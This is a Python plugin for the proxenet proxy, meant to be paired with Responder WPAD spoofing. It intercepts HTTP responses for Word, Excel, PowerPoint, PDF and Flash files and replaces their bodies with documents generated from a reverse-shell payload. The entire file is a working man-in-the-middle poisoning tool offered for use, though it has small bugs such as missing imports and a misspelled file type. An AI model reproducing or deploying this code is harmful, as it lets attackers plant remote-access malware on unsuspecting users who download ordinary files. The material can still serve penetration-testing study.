"""
This script will inject malicious content.

How to use:
- Start proxenet and load this script (autoload or manually)
  ex: $ ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/autoload/oPhishPoison.py
      $ ./proxenet -b 192.168.56.1 -p 8008
- Start Responder and point WPAD to proxenet
  ex: # ./Responder.py -v -w -I vboxnet0 -u 192.168.56.1:8008

TODO:
- add html poisoning: inject b33f javascript
- move the settings into the .proxenet.ini config file
"""

__PLUGIN__ = "oPhishPoison"
__AUTHOR__ = "@_hugsy_"


from pimp import HTTPResponse, HTTPBadResponseException


path_to_msfpayload   = "/home/hugsy/tmp/revshtcp"
path_to_python       = "/usr/bin/python2.7"
path_to_xor_payload  = "/home/hugsy/code/xor-payload/xor-payload.py"

types = {"docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
         "xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
         "pptx": "application/vnd.openxmlformats-officedocument.presentationml.presentation",
         "doc": "application/msword",
         "xls": "application/msexcel",
         "ppt": "application/vnd.ms-powerpoint",
         "pdf": "application/pdf",
         "swf": "application/x-shockwave-flash",
         }


def is_supported_type(t):
    """
    Checks if the content type is supported by our poisoining plugins. If not, the request will
    not be tampered.
    """
    for k,v in types.iteritems():
        if v.lower() == t.lower():  return k
    return None


def replace_with_malicious(http, ctype):
    """
    1. generate on-the-fly the right payload
    2. replace the HTTP body
    3. profit
    """

    # 1.
    cmd = "{python} {xor} --quiet".format(python=path_to_python, xor=path_to_xor_payload)
    if ctype in ("xslx", "xls"):    cmd += "--excel"
    elif ctype in ("docx", "doc"):  cmd += "--word"
    elif ctype in ("pptx", "ppt"):  cmd += "--powerpoint"
    elif ctype == "pdf":            cmd += "--pdf"
    elif ctype == "swf":            cmd += "--flash"

    f = open(path_to_msfpayload, "rb")
    p = subprocess.Popen(cmd.split(" "), stdin=f)
    res = p.communicate()[0]
    f.close()

    #2.
    with open(res, "rb") as f:
        http.body = f.read()

    os.unlink(res)

    # 3.
    return


def proxenet_request_hook(rid, request, uri):
    """
    proxenet_request_hook() is not useful
    """
    return request


def proxenet_response_hook(rid, response, uri):
    """
    When a HTTP response header is received, check if it has a supported content type.
    If so, inject our payload.
    """
    try:
        http = HTTPResponse(response)

        if not http.has_header("Content-Type"):
            del(http)
            return response

        detected_type = is_supported_type( http.get_header("Content-Type") )
        if detected_type is None:
            del(http)
            return response

        replace_with_malicious(http, detected_type)

        print("Poisoining {} file in response {}: {}".format(detected_type, rid, http.headers))
        return http.render()

    except HTTPBadResponseException as e :
        return response


if __name__ == "__main__":
    pass
